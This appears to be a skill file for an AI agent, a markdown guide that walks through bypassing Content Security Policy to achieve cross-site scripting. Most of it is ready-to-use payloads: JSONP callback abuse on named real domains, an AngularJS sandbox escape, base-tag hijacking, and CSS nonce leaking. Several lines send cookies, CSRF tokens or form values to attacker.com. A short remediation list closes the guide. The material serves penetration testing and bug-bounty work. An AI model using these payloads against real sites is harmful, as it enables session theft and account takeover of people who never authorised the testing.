---
name: performing-content-security-policy-bypass
description: Analyze and bypass Content Security Policy implementations to achieve cross-site scripting by exploiting misconfigurations, JSONP endpoints, unsafe directives, and policy injection techniques.
domain: cybersecurity
subdomain: web-application-security
tags: [csp-bypass, content-security-policy, xss, script-injection, nonce-bypass, jsonp, policy-misconfiguration]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing Content Security Policy Bypass

## When to Use
- When XSS is found but execution is blocked by Content Security Policy
- During web application security assessments to evaluate CSP effectiveness
- When testing the robustness of CSP against known bypass techniques
- During bug bounty hunting where CSP prevents direct XSS exploitation
- When auditing CSP header configuration for security weaknesses

## Prerequisites
- Burp Suite for intercepting responses and analyzing CSP headers
- CSP Evaluator (Google) for automated policy analysis
- Understanding of CSP directives (script-src, default-src, style-src, etc.)
- Knowledge of CSP bypass techniques (JSONP, base-uri, object-src)
- Browser developer tools for CSP violation monitoring
- Collection of whitelisted domain JSONP endpoints

## Workflow

### Step 1 — Analyze the CSP Policy
```bash
# Extract CSP from response headers
curl -sI http://target.com | grep -i "content-security-policy"

# Check for CSP in meta tags
curl -s http://target.com | grep -i "content-security-policy"

# Analyze CSP with Google CSP Evaluator
# Visit: https://csp-evaluator.withgoogle.com/
# Paste the CSP policy for automated analysis

# Check for report-only mode (not enforced)
curl -sI http://target.com | grep -i "content-security-policy-report-only"
# If only report-only exists, CSP is NOT enforced - XSS works directly

# Parse directive values
# Example CSP:
# script-src 'self' 'unsafe-inline' https://cdn.example.com;
# default-src 'self'; style-src 'self' 'unsafe-inline';
# img-src *; connect-src 'self'
```

### Step 2 — Exploit unsafe-inline and unsafe-eval
```bash
# If script-src includes 'unsafe-inline':
# CSP is effectively bypassed for inline scripts
<script>alert(document.domain)</script>
<img src=x onerror="alert(1)">

# If script-src includes 'unsafe-eval':
# eval() and related functions work
<script>eval('alert(1)')</script>
<script>setTimeout('alert(1)',0)</script>
<script>new Function('alert(1)')()</script>

# If 'unsafe-inline' with nonce:
# unsafe-inline is ignored when nonce is present (CSP3)
# Focus on nonce leaking instead
```

### Step 3 — Exploit Whitelisted Domain JSONP Endpoints
```bash
# If CSP whitelists a domain with JSONP endpoints:
# script-src 'self' https://accounts.google.com

# Find JSONP endpoints on whitelisted domains
# Google:
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

# Common JSONP endpoints:
# https://www.google.com/complete/search?client=chrome&q=test&callback=alert(1)//
# https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js

# If AngularJS is whitelisted (CDN):
# script-src includes cdnjs.cloudflare.com or ajax.googleapis.com
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

# Exploit JSONP on whitelisted APIs
<script src="https://whitelisted-api.com/endpoint?callback=alert(1)//">
</script>
```

### Step 4 — Exploit base-uri and Form Action Bypasses
```bash
# If base-uri is not restricted:
# Inject <base> tag to redirect relative script loads
<base href="https://attacker.com/">
# All relative script src will load from attacker.com

# If form-action is not restricted:
# Steal data via form submission
<form action="https://attacker.com/steal" method="POST">
  <input name="csrf_token" value="">
</form>
<script>document.forms[0].submit()</script>

# If object-src is not restricted:
# Use Flash or plugin-based XSS
<object data="https://attacker.com/exploit.swf"></object>
<embed src="https://attacker.com/exploit.swf">
```

### Step 5 — Exploit Nonce and Hash Bypasses
```bash
# Nonce leaking via CSS attribute selectors
# If attacker can inject HTML (but not script due to CSP nonce):
<style>
  script[nonce^="a"] { background: url("https://attacker.com/leak?nonce=a"); }
  script[nonce^="b"] { background: url("https://attacker.com/leak?nonce=b"); }
</style>
# Brute-force each character position to leak the nonce

# Nonce reuse detection
# If the same nonce is used across multiple pages or requests:
# Capture nonce from one page, use it to inject script on another

# DOM clobbering to override nonce checking
<form id="csp"><input name="nonce" value="attacker-controlled"></form>

# Script gadgets in whitelisted libraries
# If a whitelisted JS library has a gadget that creates scripts:
# jQuery: $.getScript(), $.globalEval()
# Lodash: _.template()
# DOMPurify bypass via prototype pollution

# Policy injection via reflected parameters
# If CSP header reflects user input:
# Inject: ;script-src 'unsafe-inline'
# Or inject: ;report-uri /csp-report;script-src-elem 'unsafe-inline'
```

### Step 6 — Exploit Data Exfiltration Without script-src
```bash
# Even without script execution, data exfiltration is possible:

# Via img-src (if allows external):
<img src="https://attacker.com/steal?data=SENSITIVE_DATA">

# Via CSS injection (if style-src allows unsafe-inline):
<style>
input[value^="a"] { background: url("https://attacker.com/?char=a"); }
input[value^="b"] { background: url("https://attacker.com/?char=b"); }
</style>

# Via connect-src (if allows external):
<script nonce="valid">
  fetch('https://attacker.com/steal?data=' + document.cookie);
</script>

# Via DNS prefetch:
<link rel="dns-prefetch" href="//data.attacker.com">

# Via WebRTC (if not blocked):
# WebRTC can leak data through STUN/TURN servers
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| unsafe-inline | CSP directive allowing inline script execution, defeating XSS protection |
| Nonce-based CSP | Using random nonces to allow specific scripts while blocking injected ones |
| JSONP Bypass | Exploiting JSONP endpoints on whitelisted domains to execute attacker callbacks |
| Policy Injection | Injecting CSP directives through reflected user input in headers |
| base-uri Hijacking | Redirecting relative script loads by injecting a base element |
| Script Gadgets | Legitimate library features that can be abused to bypass CSP |
| CSP Report-Only | Non-enforcing CSP mode that only logs violations without blocking |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| CSP Evaluator | Google tool for analyzing CSP policy weaknesses |
| Burp Suite | HTTP proxy for CSP header analysis and bypass testing |
| CSP Scanner | Browser extension for identifying CSP bypass opportunities |
| csp-bypass | Curated list of CSP bypass techniques and payloads |
| RetireJS | Identify vulnerable JavaScript libraries on whitelisted CDNs |
| DOM Invader | Burp tool for testing CSP bypasses through DOM manipulation |

## Common Scenarios

1. **JSONP Callback XSS** — Exploit JSONP endpoints on whitelisted CDN domains to execute JavaScript callbacks containing XSS payloads
2. **AngularJS Sandbox Escape** — Load AngularJS from whitelisted CDN and use template injection to bypass CSP script restrictions
3. **Nonce Leakage** — Extract CSP nonce values through CSS injection or DOM clobbering to inject scripts with valid nonces
4. **Base URI Hijacking** — Inject base element to redirect all relative script loads to attacker-controlled server
5. **Report-Only Exploitation** — Identify CSP in report-only mode where violations are logged but not blocked, enabling direct XSS

## Output Format

```
## CSP Bypass Assessment Report
- **Target**: http://target.com
- **CSP Mode**: Enforced
- **Policy**: script-src 'self' https://cdn.jsdelivr.net; default-src 'self'

### CSP Analysis
| Directive | Value | Risk |
|-----------|-------|------|
| script-src | 'self' cdn.jsdelivr.net | JSONP/Library bypass possible |
| default-src | 'self' | Moderate |
| base-uri | Not set | base-uri hijacking possible |
| object-src | Not set (falls back to default-src) | Low |

### Bypass Techniques Found
| # | Technique | Payload | Impact |
|---|-----------|---------|--------|
| 1 | AngularJS via CDN | Load angular.min.js + template injection | Full XSS |
| 2 | Missing base-uri | <base href="https://evil.com/"> | Script hijack |

### Remediation
- Remove whitelisted CDN domains; use nonce-based or hash-based CSP
- Add base-uri 'self' to prevent base element injection
- Add object-src 'none' to block plugin-based execution
- Migrate from unsafe-inline to strict nonce-based policy
- Implement strict-dynamic for modern CSP3 browsers
```
